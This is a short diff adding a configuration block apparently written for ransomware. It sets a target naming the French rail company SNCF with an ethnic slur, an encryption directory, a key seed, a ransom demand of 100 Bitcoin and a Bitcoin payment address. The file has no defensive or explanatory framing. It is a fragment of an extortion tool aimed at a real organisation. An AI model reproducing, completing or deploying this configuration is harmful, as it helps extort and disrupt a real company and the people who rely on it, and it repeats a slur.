@@ -1,0 +1,5 @@
+target = 'SNCF froggies'
+encrypt_dir = ''
+key_seed = '(WIP)'
+request_amount = '100 BTC'
+btc_addr = '1GVL3NPtESgz73rcom1ipZdBitdn8ffnco'
